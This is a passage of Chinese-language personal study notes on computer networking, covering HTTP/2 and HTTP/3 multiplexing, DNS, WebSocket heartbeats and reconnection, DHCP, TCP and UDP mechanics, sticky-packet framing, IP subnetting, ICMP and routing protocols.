对请求复用进行了显著的改进，特别是在减少延迟和解决 HTTP&#x2F;1.x 中的“队头阻塞”问题方面。</p><h4 id="多路复用（Multiplexing）"><a href="#多路复用（Multiplexing）" class="headerlink" title="多路复用（Multiplexing）"></a><strong>多路复用（Multiplexing）</strong></h4><ul><li><strong>多路复用</strong>是 HTTP&#x2F;2 的核心特性之一。HTTP&#x2F;2 允许多个请求和响应在同一个连接上 <strong>并行</strong> 发送，而不会互相阻塞。不同的请求和响应通过 <strong>流（stream）</strong> 来区分，每个流有一个唯一的标识符。这样，多个请求和响应可以同时在同一个连接上发送和接收，而不必等待前一个请求的完成。<ul><li><strong>流（Stream）</strong>：HTTP&#x2F;2 中的流是一条双向的数据通道，允许请求和响应并行进行。每个流可以独立传输数据，并且流之间是互相独立的，不会因为一个流的延迟而影响其他流的传输。</li><li><strong>头部压缩</strong>：HTTP&#x2F;2 使用 <strong>HPACK</strong> 头部压缩机制，减少了重复的头部信息，从而节省带宽和提高传输效率。</li><li><strong>优先级和流控制</strong>：HTTP&#x2F;2 允许客户端和服务器为不同的请求分配优先级，以便合理利用带宽和资源。</li></ul></li></ul><h4 id="减少延迟"><a href="#减少延迟" class="headerlink" title="减少延迟"></a><strong>减少延迟</strong></h4><ul><li>在 HTTP&#x2F;2 中，客户端可以在同一个连接中同时发送多个请求，不需要等待每个请求的响应。这意味着对于加载多个资源（如图片、CSS、JavaScript 文件等）时，所有的请求可以并行地发送，显著减少了加载时间。</li><li><strong>请求复用</strong> 解决了 HTTP&#x2F;1.x 中的队头阻塞问题，即使是同一个连接上的多个请求，它们也能够并行传输，从而大幅提高了性能。</li></ul><h4 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a><strong>头部压缩</strong></h4><ul><li>HTTP&#x2F;2 使用 <strong>HPACK</strong> 压缩算法来压缩 HTTP 请求和响应的头部信息，减少了传输的数据量，进一步提高了效率。</li></ul><h3 id="HTTP-3-的请求复用（基于-QUIC）"><a href="#HTTP-3-的请求复用（基于-QUIC）" class="headerlink" title="HTTP&#x2F;3 的请求复用（基于 QUIC）"></a><strong>HTTP&#x2F;3 的请求复用（基于 QUIC）</strong></h3><p><strong>HTTP&#x2F;3</strong> 是基于 <strong>QUIC</strong> 协议的，它进一步改进了请求复用，并解决了网络中断时的恢复问题。</p><h4 id="QUIC-和-HTTP-3"><a href="#QUIC-和-HTTP-3" class="headerlink" title="QUIC 和 HTTP&#x2F;3"></a><strong>QUIC 和 HTTP&#x2F;3</strong></h4><ul><li>HTTP&#x2F;3 基于 <strong>QUIC</strong>（Quick UDP Internet Connections）协议，QUIC 是一个基于 <strong>UDP</strong> 的协议，旨在降低延迟并提高可靠性。QUIC 本身具有多路复用的能力，允许多个请求和响应并行处理。</li><li>由于 QUIC 设计时就考虑到了减少连接建立时间，它比基于 TCP 的 HTTP&#x2F;2 更加高效，尤其是在网络不稳定或需要频繁切换网络的情况下。</li><li><strong>QUIC</strong> 通过 <strong>0-RTT</strong> 连接恢复，减少了建立连接的时间，从而进一步降低了延迟。</li></ul><h4 id="请求复用"><a href="#请求复用" class="headerlink" title="请求复用"></a><strong>请求复用</strong></h4><ul><li>在 HTTP&#x2F;3 中，多个请求和响应仍然能够在一个连接中并行地进行，并且不受 TCP 的限制（如队头阻塞）。QUIC 本身在多个数据流上进行多路复用，支持更高效的并发传输。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>HTTP&#x2F;1.1</strong> 提供了持久连接的功能，允许在同一个 TCP 连接上复用多个请求，但由于“队头阻塞”问题，它的复用效率有限。</li><li><strong>HTTP&#x2F;2</strong> 引入了 <strong>多路复用</strong>，允许多个请求和响应并行地在同一个连接上进行传输，显著提高了效率并减少了延迟。</li><li><strong>HTTP&#x2F;3</strong> 在 HTTP&#x2F;2 的基础上使用了 <strong>QUIC</strong> 协议，进一步优化了请求复用，特别是在减少连接建立时间和提高传输效率方面。</li></ul><p>因此，HTTP&#x2F;2 和 HTTP&#x2F;3 提供了更加高效的请求复用机制，相比于 HTTP&#x2F;1.x，它们在多个资源并行加载和减少延迟方面表现更优。</p><hr><h2 id="DNS-协议与域名解析过程"><a href="#DNS-协议与域名解析过程" class="headerlink" title="DNS 协议与域名解析过程"></a>DNS 协议与域名解析过程</h2><p>DNS 是将域名解析为 IP 地址的协议，是一切网络访问的起点。比如在浏览器中输入 <code>www.example.com</code>，系统会首先发起一次 DNS 查询。</p><p>DNS 查询过程可能包括：</p><ul><li>本地 DNS 缓存查找</li><li>向本地域名服务器发起递归查询</li><li>逐层向根域名服务器、顶级域名服务器、权威服务器发起迭代查询</li><li>获取到 IP 地址后，将结果缓存一段时间</li></ul><hr><h2 id="WebSocket-实现双向通信"><a href="#WebSocket-实现双向通信" class="headerlink" title="WebSocket 实现双向通信"></a>WebSocket 实现双向通信</h2><p>WebSocket 是建立在 HTTP 协议之上的全双工通信协议，适用于需要实时推送的应用场景，比如在线聊天、股票行情、游戏等。</p><p>WebSocket 在建立连接阶段，会通过 HTTP 协议完成一次握手，之后升级为长连接通道，可以实现客户端与服务端之间的持续通信。</p><p>它的优势在于：</p><ul><li>减少 HTTP 的频繁握手开销</li><li>支持低延迟、持续推送</li><li>客户端和服务器都可以主动发送消息</li></ul><p>常见问题包括：与轮询、长轮询的区别、心跳机制的实现方式、如何处理断线重连等。</p><h3 id="Websocket-轮询、长轮询"><a href="#Websocket-轮询、长轮询" class="headerlink" title="Websocket 轮询、长轮询"></a>Websocket 轮询、长轮询</h3><h4 id="轮询（Polling）"><a href="#轮询（Polling）" class="headerlink" title="轮询（Polling）"></a><strong>轮询（Polling）</strong></h4><ul><li><strong>定义</strong>：轮询是一种定时向服务器发送请求，查询数据是否有更新的方式。</li><li><strong>工作原理</strong>：<ul><li>客户端定时发送HTTP请求到服务器，询问是否有新的数据或事件。</li><li>服务器处理请求并返回结果，客户端再根据返回的数据更新页面。</li></ul></li><li><strong>特点</strong>：<ul><li>每隔一定时间（例如每秒）发送HTTP请求到服务器，即便没有新数据，服务器也会返回一个空的响应。</li><li>消耗带宽：即使没有新数据，轮询也会带来不必要的请求和响应负载。</li><li>延迟较高：因为请求是定期发起的，所以客户端无法获得即时更新。</li></ul></li></ul><h4 id="长轮询（Long-Polling）"><a href="#长轮询（Long-Polling）" class="headerlink" title="长轮询（Long Polling）"></a><strong>长轮询（Long Polling）</strong></h4><ul><li><strong>定义</strong>：长轮询是轮询的改进版，客户端发送请求到服务器，直到服务器有新数据时才响应。</li><li><strong>工作原理</strong>：<ul><li>客户端向服务器发送一个HTTP请求，服务器如果有新数据，则立即返回响应；如果没有新数据，服务器会保持连接，直到有数据时再返回响应。</li><li>客户端接收到响应后，再次发起新的请求，继续等待服务器的更新。</li></ul></li><li><strong>特点</strong>：<ul><li>更低的带宽消耗：相较于轮询，长轮询只有在有新数据时才返回响应。</li><li>相较于传统轮询，长轮询的延迟较低，因为它减少了不必要的请求。</li><li>仍然是单向的：尽管是保持连接，客户端和服务器之间的通信仍然是单向的，服务器只能响应客户端的请求。</li></ul></li></ul><h3 id="WebSocket-心跳机制的实现方式"><a href="#WebSocket-心跳机制的实现方式" class="headerlink" title="WebSocket 心跳机制的实现方式"></a><strong>WebSocket 心跳机制的实现方式</strong></h3><p><strong>心跳机制</strong>（Heartbeat）是为了保持 WebSocket 连接的有效性，防止连接因空闲超时被中间设备（如防火墙、代理服务器）关闭。它还可以帮助客户端检测服务器是否正常运行。</p><h4 id="实现方式："><a href="#实现方式：" class="headerlink" title="实现方式："></a><strong>实现方式</strong>：</h4><ol><li><strong>客户端发起心跳</strong>：<ul><li>客户端定期向服务器发送简单的 <strong>ping</strong> 请求，例如每隔一定的时间（如 30 秒或 1 分钟），客户端发送一个空的数据包，服务器收到后返回 <strong>pong</strong>。</li><li>如果客户端在超时之前没有收到响应，说明连接可能已断开，客户端可以尝试重新连接。</li></ul></li><li><strong>服务器发起心跳</strong>：<ul><li>服务器可以定期向客户端发送 <strong>ping</strong> 请求，客户端收到后返回 <strong>pong</strong> 响应。</li><li>如果客户端在一定时间内没有返回 <strong>pong</strong>，服务器可以主动关闭连接或重新连接。</li></ul></li><li><strong>使用 WebSocket 扩展</strong>：<ul><li>一些库或框架会实现 WebSocket 扩展，自动进行心跳机制的管理，确保连接的稳定性。</li></ul></li><li><strong>心跳消息格式</strong>：<ul><li>通常心跳消息内容为空，例如：<code>ping</code> 和 <code>pong</code>，这并不涉及任何实际的数据传输，仅仅是连接活跃的信号。</li></ul></li></ol><h3 id="WebSocket-断线重连处理"><a href="#WebSocket-断线重连处理" class="headerlink" title="WebSocket 断线重连处理"></a><strong>WebSocket 断线重连处理</strong></h3><p><strong>断线重连</strong>是保证 WebSocket 连接在网络异常或服务器断开连接的情况下能够自动恢复连接的机制。</p><ol><li><strong>客户端检测连接状态</strong>：<ul><li>客户端需要监听 WebSocket 的 <strong>onclose</strong> 事件，检测到连接断开后，触发重连逻辑。</li><li>客户端可以设置一个 <strong>重连延迟</strong>，逐步延迟重连尝试，避免因过于频繁的重连请求造成额外的负载。</li></ul></li><li><strong>指数退避算法</strong>：<ul><li>使用指数退避算法（Exponential Backoff）来避免频繁重连。每次重连失败后，重连间隔逐步增加，直到达到最大重连次数或时间。</li></ul></li><li><strong>自动重连逻辑</strong>：<ul><li>客户端可以在 WebSocket 断开后设置自动重连。例如，在 <code>onclose</code> 事件中，尝试重新建立连接，直到成功。</li><li>有时可以结合心跳机制，定期检查连接的状态，在连接失效时触发重连。</li></ul></li><li><strong>服务器端处理</strong>：<ul><li>服务器端可以设置连接的 <strong>超时时间</strong>，如果客户端长时间未能响应心跳或者其他操作，服务器会主动关闭连接。</li><li>服务器应能在客户端重连时恢复之前的会话状态，避免丢失数据。</li></ul></li></ol><hr><h2 id="常见的其他应用层协议"><a href="#常见的其他应用层协议" class="headerlink" title="常见的其他应用层协议"></a>常见的其他应用层协议</h2><p>除了 HTTP、HTTPS 和 DNS，还有很多常用协议在实际开发和部署中不可或缺：</p><h3 id="FTP（文件传输协议）"><a href="#FTP（文件传输协议）" class="headerlink" title="FTP（文件传输协议）"></a>FTP（文件传输协议）</h3><ul><li>基于 TCP</li><li>支持用户认证、文件上传下载</li><li>有主动模式和被动模式之分，网络环境复杂时需谨慎配置防火墙</li></ul><h3 id="SMTP、POP3、IMAP（电子邮件协议）"><a href="#SMTP、POP3、IMAP（电子邮件协议）" class="headerlink" title="SMTP、POP3、IMAP（电子邮件协议）"></a>SMTP、POP3、IMAP（电子邮件协议）</h3><ul><li>SMTP 用于发送邮件，POP3 和 IMAP 用于接收邮件</li><li>POP3 会将邮件拉取到本地，IMAP 则支持服务器同步</li><li>现在常见邮件服务通常使用加密版本，如 SMTPS、IMAPS</li></ul><hr><h2 id="DHCP（Dynamic-Host-Configuration-Protocol，动态主机配置协议）"><a href="#DHCP（Dynamic-Host-Configuration-Protocol，动态主机配置协议）" class="headerlink" title="DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）"></a>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）</h2><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）工作在<strong>应用层</strong>。</p><p>虽然它的主要作用是为主机<strong>自动分配 IP 地址、子网掩码、网关、DNS 等网络参数</strong>，这些信息属于网络层的范畴，但协议本身是由应用层定义和执行的。</p><p><strong>DHCP 的运作机制简述</strong></p><p>DHCP 通常在局域网中使用，典型流程如下：</p><ol><li><strong>DHCP Discover</strong>：新加入网络的主机会广播发送 DHCP Discover 报文，寻找可用的 DHCP 服务器</li><li><strong>DHCP Offer</strong>：DHCP 服务器响应并提供一个可用的 IP 地址等配置信息</li><li><strong>DHCP Request</strong>：主机从接收到的多个 Offer 中选择一个，并发出 Request 报文表示接受</li><li><strong>DHCP Acknowledgement</strong>：服务器确认并正式分配该地址</li></ol><p>这个过程简称为 <strong>DORA（Discover, Offer, Request, Acknowledgement）</strong> 四步交互。</p><p><strong>DHCP 属于应用层的原因</strong></p><ul><li>协议的实现是在应用层完成的，使用的是客户端-服务器模型</li><li>运行在 UDP 协议之上（即传输层用的是 UDP）<ul><li>客户端使用端口 <strong>68</strong></li><li>服务器使用端口 <strong>67</strong></li></ul></li><li>报文格式和交互逻辑定义在应用层协议规范中</li></ul><p><strong>DHCP 与其他网络层协议的关系</strong></p><p>虽然 DHCP 协议属于应用层，但它的作用直接影响网络层的工作：</p><ul><li>为网络层配置所需的 IP 地址、子网掩码、默认网关</li><li>帮助主机自动获取 DNS 地址，从而支持域名解析（也是应用层功能）</li></ul><p>因此可以理解为：<strong>DHCP 是一个在应用层工作的协议，用来自动配置网络层参数</strong>。</p><hr><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="传输层的作用"><a href="#传输层的作用" class="headerlink" title="传输层的作用"></a>传输层的作用</h2><p>传输层位于应用层之下，主要负责在两个主机之间提供<strong>端到端</strong>的数据传输服务。相比网络层只关心数据从哪台主机传到哪台主机，传输层更进一步，确保<strong>具体的应用程序</strong>之间可以可靠或高效地通信。</p><p>常见的传输层协议包括 TCP 和 UDP。两者在可靠性、传输速度、连接管理等方面差异明显，适用场景也不同。</p><hr><h2 id="TCP-协议的核心特性"><a href="#TCP-协议的核心特性" class="headerlink" title="TCP 协议的核心特性"></a>TCP 协议的核心特性</h2><p>TCP（Transmission Control Protocol）是面向连接的协议，强调<strong>可靠传输</strong>，具备完整的错误检测、丢包重传、数据排序与流量控制机制。</p><h3 id="面向连接"><a href="#面向连接" class="headerlink" title="面向连接"></a>面向连接</h3><p>TCP 通信前必须建立连接，这一过程通过“三次握手”完成。连接建立后，双方可以双向稳定通信，通信结束后通过“四次挥手”释放连接资源。</p><h3 id="有序传输"><a href="#有序传输" class="headerlink" title="有序传输"></a>有序传输</h3><p>TCP 使用序列号（Sequence Number）对每一个字节进行编号，接收方按顺序重组数据，确保数据按发送顺序到达。</p><h3 id="可靠传输机制"><a href="#可靠传输机制" class="headerlink" title="可靠传输机制"></a>可靠传输机制</h3><p>TCP 提供多种机制保障传输可靠：</p><ul><li><strong>确认应答</strong>：接收方每收到数据会发送 ACK 确认包</li><li><strong>重传机制</strong>：若一定时间内未收到 ACK，发送方会重发数据</li><li><strong>超时重传</strong>：根据 RTT 动态计算超时时间，避免网络阻塞</li><li><strong>拥塞控制与流量控制</strong>：根据网络状态和接收能力调整发送速度，防止网络拥塞或接收端被压垮</li></ul><h3 id="全双工通信"><a href="#全双工通信" class="headerlink" title="全双工通信"></a>全双工通信</h3><p>TCP 支持双方同时发送和接收数据，底层通过维护两个单独的数据流来实现。</p><hr><h2 id="TCP-三次握手与四次挥手"><a href="#TCP-三次握手与四次挥手" class="headerlink" title="TCP 三次握手与四次挥手"></a>TCP 三次握手与四次挥手</h2><h3 id="三次握手过程"><a href="#三次握手过程" class="headerlink" title="三次握手过程"></a>三次握手过程</h3><ol><li>客户端发送 SYN（同步）包，进入 SYN_SENT 状态</li><li>服务器回复 SYN+ACK 包，进入 SYN_RCVD 状态</li><li>客户端回复 ACK，双方进入 ESTABLISHED 状态，连接建立完成</li></ol><p>这样可以确保双方都具备发送与接收的能力，并同步初始序列号。</p><h3 id="四次挥手过程"><a href="#四次挥手过程" class="headerlink" title="四次挥手过程"></a>四次挥手过程</h3><ol><li>客户端发送 FIN，表示无数据可发</li><li>服务器回复 ACK，进入 CLOSE_WAIT 状态</li><li>服务器处理完剩余数据后，发送 FIN</li><li>客户端回复 ACK，等待一段时间后关闭连接</li></ol><p>这种拆分可以让服务器在释放连接前处理完未发送完的数据。</p><hr><h2 id="TCP-的流量控制与拥塞控制"><a href="#TCP-的流量控制与拥塞控制" class="headerlink" title="TCP 的流量控制与拥塞控制"></a>TCP 的流量控制与拥塞控制</h2><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>TCP 使用<strong>滑动窗口机制</strong>进行流量控制，窗口大小由接收方通知发送方，表示“还能接收多少数据”。发送方根据这个值控制发送速率，避免接收方缓存被压满。</p><h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>TCP 通过以下策略应对网络拥塞：</p><ul><li>**慢启动（Slow Start）：**每次翻倍，直到阈值后进入拥塞避免</li><li>**拥塞避免（Congestion Avoidance）：**线性增加</li><li>**快速重传（Fast Retransmit）：**发送方收到三个连续的对最后包的ACK，说明后续包丢失，触发快速重传</li><li>**快速恢复（Fast Recovery）：**触发快速重传后，拥塞窗口（CWND） 会被 减少到慢启动阈值（ssthresh）的一半，并且 ssthresh 被设置为当前 CWND 的一半，然后线性增长，大概是这样，这里具体是啥忘了。。</li></ul><p>这些策略通过调整拥塞窗口大小，在检测到丢包时迅速反应，从而动态调节传输速率。</p><hr><h2 id="UDP-协议的特点"><a href="#UDP-协议的特点" class="headerlink" title="UDP 协议的特点"></a>UDP 协议的特点</h2><p>UDP（User Datagram Protocol）是无连接的协议，强调<strong>快速、轻量、无需握手</strong>。</p><h3 id="无连接模型"><a href="#无连接模型" class="headerlink" title="无连接模型"></a>无连接模型</h3><p>UDP 不建立连接，也不维持连接状态，发送数据不需要对方回应。适用于对时延要求高、偶尔丢包可以接受的场景，如视频通话、语音传输、DNS 请求等。</p><h3 id="不保证顺序和可靠性"><a href="#不保证顺序和可靠性" class="headerlink" title="不保证顺序和可靠性"></a>不保证顺序和可靠性</h3><p>UDP 数据包称为“数据报”，独立发送，不保证顺序，也不重传丢失的包。上层应用如果需要可靠性，需要自己实现逻辑。</p><h3 id="高效传输"><a href="#高效传输" class="headerlink" title="高效传输"></a>高效传输</h3><p>由于没有握手、确认等机制，UDP 的延迟更低，适合实时性强的通信场景。</p><hr><h2 id="传输层端口的作用"><a href="#传输层端口的作用" class="headerlink" title="传输层端口的作用"></a>传输层端口的作用</h2><p>传输层使用端口号来区分主机上的不同进程。每个网络连接都有四元组标识：</p><ul><li>源 IP</li><li>源端口</li><li>目标 IP</li><li>目标端口</li></ul><p>端口范围为 0-65535，其中 0-1023 为知名端口，常见如：</p><ul><li>HTTP：80</li><li>HTTPS：443</li><li>DNS：53</li><li>FTP：21</li><li>SSH：22</li></ul><p>端口号帮助操作系统将收到的数据准确交付到目标应用程序。</p><hr><h2 id="TCP-粘包与拆包问题"><a href="#TCP-粘包与拆包问题" class="headerlink" title="TCP 粘包与拆包问题"></a>TCP 粘包与拆包问题</h2><p><strong>粘包和拆包</strong> 是在 <strong>TCP</strong> 协议中常见的问题，通常发生在数据发送和接收的过程中。由于 <strong>TCP</strong> 是面向流的协议（stream-oriented），它并不像 <strong>UDP</strong> 那样把每个数据包都当作独立的单位进行处理，而是将数据流通过一个持续的连接进行传输。这种特性导致了 <strong>粘包</strong> 和 <strong>拆包</strong> 问题的出现。</p><h3 id="什么是粘包和拆包"><a href="#什么是粘包和拆包" class="headerlink" title="什么是粘包和拆包"></a><strong>什么是粘包和拆包</strong></h3><ul><li><strong>粘包（Packet Concatenation）</strong>：在发送多个数据包时，由于 TCP 协议是一个 <strong>面向流的协议</strong>，多个数据包可能被合并成一个大的数据块发送，接收方接收到的数据就可能包含了多个发送的数据包。这种现象叫做“<strong>粘包</strong>”。也就是说，接收方读取的一个数据包可能包含了多个逻辑数据包，接收方需要能够正确区分这些数据包。</li><li><strong>拆包（Packet Fragmentation）</strong>：拆包与粘包相反，发生在发送的数据包被拆分成多个部分。由于网络传输的最大传输单元（MTU）限制，数据包可能会被分割为多个部分进行发送，接收方需要正确地将这些部分重新组合成一个完整的消息。也就是说，发送方发送的数据包可能会被拆成多个小块，接收方需要知道如何将这些碎片拼接回原始数据包。</li></ul><h3 id="为什么会发生粘包和拆包问题"><a href="#为什么会发生粘包和拆包问题" class="headerlink" title="为什么会发生粘包和拆包问题"></a>为什么会发生粘包和拆包问题</h3><p>TCP 是一个 <strong>面向字节流</strong> 的协议，它不会保留消息边界的概念。这意味着：</p><ul><li>在传输过程中，发送方并不会告诉接收方每次发送的数据包的边界（即数据包的开始和结束）。</li><li>接收方收到的 TCP 数据流可能是由多个包拼接成的一个大数据块，或者一个大包被拆分成多个小数据块。</li></ul><p>这些特点导致了 <strong>粘包</strong> 和 <strong>拆包</strong> 问题的出现。</p><h4 id="粘包的原因："><a href="#粘包的原因：" class="headerlink" title="粘包的原因："></a><strong>粘包的原因</strong>：</h4><ul><li><strong>发送方连续快速发送数据</strong>：发送方将多个数据包快速发送，接收方无法分辨各个数据包的边界。</li><li><strong>TCP的流式传输</strong>：TCP 将数据作为字节流发送，没有对消息边界的明确区分，接收方必须根据协议自行处理数据的划分。</li></ul><h4 id="拆包的原因："><a href="#拆包的原因：" class="headerlink" title="拆包的原因："></a><strong>拆包的原因</strong>：</h4><ul><li><strong>数据包大小超出网络的最大传输单元（MTU）</strong>：TCP 会根据网络的最大传输单元来分割数据，如果发送的数据包大小超过了 MTU，数据会被拆分成多个部分发送。</li><li><strong>数据过大或系统缓冲区限制</strong>：系统在传输过程中可能会因为缓冲区大小的限制将数据拆分为多个部分。</li></ul><h3 id="TCP-如何处理粘包和拆包问题"><a href="#TCP-如何处理粘包和拆包问题" class="headerlink" title="TCP 如何处理粘包和拆包问题"></a><strong>TCP 如何处理粘包和拆包问题</strong></h3><p>TCP 协议本身并不提供 <strong>消息边界</strong> 的机制，因此开发者需要在 <strong>应用层</strong> 处理粘包和拆包问题。常见的解决方法包括：</p><h4 id="固定长度的数据包"><a href="#固定长度的数据包" class="headerlink" title="固定长度的数据包"></a><strong>固定长度的数据包</strong></h4><ul><li><strong>概念</strong>：如果每个发送的数据包的大小是固定的，接收方就可以通过固定长度来划分数据流。例如，每次发送的数据包都是 1024 字节，那么接收方每次就可以按照 1024 字节来读取数据。</li><li><strong>优点</strong>：简单且容易实现，接收方只需每次读取固定长度的数据即可。</li><li><strong>缺点</strong>：如果数据包大小不固定，或者数据变化较大，这种方式就不能很好地处理。</li></ul><h4 id="分隔符（协议中的特殊标识符）"><a href="#分隔符（协议中的特殊标识符）" class="headerlink" title="分隔符（协议中的特殊标识符）"></a><strong>分隔符（协议中的特殊标识符）</strong></h4><ul><li><strong>概念</strong>：通过在每个数据包的末尾加上一个特殊的分隔符（例如换行符 <code>\n</code> 或自定义的结束标志），接收方通过检测这些分隔符来判断数据包的边界。</li><li><strong>优点</strong>：简单易用，适用于小数据量的传输。</li><li><strong>缺点</strong>：如果数据内容本身可能包含这些分隔符，必须保证发送的数据内容不干扰分隔符的作用，或者使用更复杂的编码方式来保证分隔符的唯一性。</li></ul><h4 id="长度字段（长度前缀）"><a href="#长度字段（长度前缀）" class="headerlink" title="长度字段（长度前缀）"></a><strong>长度字段（长度前缀）</strong></h4><ul><li><strong>概念</strong>：每个数据包的开头附加一个固定长度的字段，表示该数据包的长度。接收方首先读取长度字段，然后根据长度字段来读取实际的数据内容。</li><li><strong>工作流程</strong>：<ol><li>发送方在每个数据包的头部加上一个 <strong>长度字段</strong>（例如 4 字节，用来表示数据包的大小）。</li><li>接收方首先读取这个长度字段，然后根据长度字段读取相应数量的字节。</li></ol></li><li><strong>优点</strong>：这种方式能够很好地处理变长的数据包，适用于各种情况。</li><li><strong>缺点</strong>：每个数据包需要额外的存储空间来保存长度字段，这增加了额外的开销。</li></ul><h4 id="基于时间的读取"><a href="#基于时间的读取" class="headerlink" title="基于时间的读取"></a><strong>基于时间的读取</strong></h4><ul><li><strong>概念</strong>：接收方根据一个固定的超时时间来确定数据包的边界。它不断地从 TCP 流中读取数据，当读取到一定数量的数据后，或者等待超时后，就将这些数据作为一个完整的消息处理。</li><li><strong>优点</strong>：简单且适用于数据传输速度较慢或传输间隔较长的场景。</li><li><strong>缺点</strong>：依赖于延时和时间的控制，可能不适用于高性能要求的场景。</li></ul><h3 id="实际应用中的常见方法"><a href="#实际应用中的常见方法" class="headerlink" title="实际应用中的常见方法"></a><strong>实际应用中的常见方法</strong></h3><ul><li><strong>HTTP 协议</strong>：HTTP 使用 <strong>请求头</strong> 中的 <code>Content-Length</code> 或 <strong>Transfer-Encoding</strong>（如分块传输编码）来标识每个数据包的大小，从而避免了粘包和拆包问题。</li><li><strong>WebSocket</strong>：WebSocket 协议提供了基于消息的传输，可以避免粘包和拆包问题，因为它保证每个消息都是独立的，不会混合或拆分。</li><li><strong>自定义协议</strong>：在很多应用中，开发者会使用 <strong>长度字段</strong> 或 <strong>分隔符</strong> 来设计自定义协议，以解决粘包和拆包问题。例如，使用 <code>\n</code> 来分隔每一行数据，或者在每个数据包前加上长度字段，告诉接收方数据的大小。</li></ul><hr><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="网络层的作用"><a href="#网络层的作用" class="headerlink" title="网络层的作用"></a>网络层的作用</h2><p>网络层位于传输层之下，主要负责将数据从一台主机<strong>跨越多个网络</strong>传输到另一台主机。其核心任务包括：</p><ul><li><strong>寻址</strong>：为每台主机分配唯一的地址（IP 地址）</li><li><strong>路由</strong>：选择一条合适的路径将数据包从源头传到目的地</li><li><strong>分片与重组</strong>：在链路层无法承载大数据包时进行分段传输</li></ul><p>可以将网络层类比为快递公司的“全国调度系统”，负责确定哪条路线可以最快、最稳地将快递送到目的地城市。</p><hr><h2 id="IP-协议与地址结构"><a href="#IP-协议与地址结构" class="headerlink" title="IP 协议与地址结构"></a>IP 协议与地址结构</h2><p>IP 协议（Internet Protocol）是网络层的核心协议。每台连接到网络的设备都需要一个唯一的 IP 地址，用来标识其网络位置。</p><h3 id="IPv4-地址结构"><a href="#IPv4-地址结构" class="headerlink" title="IPv4 地址结构"></a>IPv4 地址结构</h3><p>IPv4 使用 32 位地址，通常以点分十进制表示，例如：<code>192.168.1.1</code></p><p>IP 地址由两部分组成：</p><ul><li><strong>网络号</strong>：标识所属的网络</li><li><strong>主机号</strong>：标识该网络中的主机</li></ul><p>为了支持更多网络，IP 地址又与“子网掩码”配合使用，进行网络划分。</p><p>例如：<br>IP 地址：<code>192.168.1.10</code><br>子网掩码：<code>255.255.255.0</code><br>则网络号为 <code>192.168.1.0</code>，主机号为 <code>10</code></p><hr><h2 id="子网划分与-CIDR-表示法"><a href="#子网划分与-CIDR-表示法" class="headerlink" title="子网划分与 CIDR 表示法"></a>子网划分与 CIDR 表示法</h2><p>为了更灵活地管理 IP 资源，引入了无类别域间路由（CIDR）表示法。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.0/24</span><br></pre></td></tr></table></figure><p>其中 <code>/24</code> 表示前 24 位是网络号，后 8 位用于主机编号。可以容纳的主机数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2^(32 - 子网掩码长度) - 2</span><br></pre></td></tr></table></figure><p>常见的子网划分技巧包括：</p><ul><li>减少广播范围，提升局域网效率</li><li>合理分配地址空间，减少浪费</li><li>提供更好的网络隔离和安全性</li></ul><hr><h2 id="IP-数据报结构与分片机制"><a href="#IP-数据报结构与分片机制" class="headerlink" title="IP 数据报结构与分片机制"></a>IP 数据报结构与分片机制</h2><p>IP 协议是<strong>无连接、不可靠</strong>的，主要负责将数据打包为 IP 数据报并发送。</p><p>数据报结构包括：</p><ul><li>首部：版本号、源 IP、目标 IP、TTL、协议类型等</li><li>数据部分：封装的传输层数据（如 TCP 报文）</li></ul><p>当数据报超过底层链路的最大传输单元（MTU）时，需要进行<strong>分片</strong>：</p><ul><li>每片包含 IP 首部 + 数据片段</li><li>设置分片偏移标志，指明每片在原始数据中的位置</li><li>目标主机在收到所有片段后再重新组装</li></ul><p>注意：IP 分片通常由发送端或路由器完成，但过度分片可能影响性能，很多现代协议（如 TCP）会避免发送超出 MTU 的数据包。</p><hr><h2 id="ICMP-协议与网络诊断"><a href="#ICMP-协议与网络诊断" class="headerlink" title="ICMP 协议与网络诊断"></a>ICMP 协议与网络诊断</h2><p>ICMP（Internet Control Message Protocol）是网络层的重要辅助协议，主要用于网络诊断和错误反馈。</p><p>常见用途：</p><ul><li><code>ping</code> 命令：通过发送 ICMP Echo 请求检测目标主机是否可达</li><li><code>traceroute</code> 工具：用于查看数据经过的所有路由节点，通过控制 TTL 值和接收 ICMP 超时报文实现</li></ul><p>ICMP 类型众多，例如：</p><ul><li>类型 0：Echo Reply</li><li>类型 3：目标不可达</li><li>类型 11：TTL 超时</li></ul><p>虽然 ICMP 不用于传输实际业务数据，但在排查网络故障、判断网络连通性时极为重要。</p><hr><h2 id="路由选择与路由协议"><a href="#路由选择与路由协议" class="headerlink" title="路由选择与路由协议"></a>路由选择与路由协议</h2><p>网络层需要选择一条合适的路径将数据包从源头传送到目标地址，这就依赖于<strong>路由表</strong>和<strong>路由协议</strong>。</p><h3 id="静态路由与动态路由"><a href="#静态路由与动态路由" class="headerlink" title="静态路由与动态路由"></a>静态路由与动态路由</h3><ul><li>静态路由：由管理员手动配置，适用于结构简单、变化少的网络</li><li>动态路由：由路由协议自动计算和维护，适用于大型复杂网络</li></ul><h3 id="常见的路由协议"><a href="#常见的路由协议" class="headerlink" title="常见的路由协议"></a>常见的路由协议</h3><ul><li><strong>RIP（Routing Information Protocol）</strong>：基于跳数，收敛慢，适合小网络，属于网关协议 (IGP - Interior Gateway Protocol)</li><li><strong>OSPF（Open Shortest Path First）</strong>：基于链路状态，收敛快、可扩展性强，属于内部网关协议</li><li><strong>BGP（Border Gateway Protocol）</strong>：用于自治系统间的路由，是互联网骨干的重要协议，属于外部网关协议 (EGP - Exterior Gateway Protocol)</li></ul><p>每种协议都有自己的适用范围和策略权重，实际使用时通常会根据网络规模和稳定性要求综合选择。</p><hr><h2 id="网络地址转换（NAT）"><a href="#网络地址转换（NAT）" 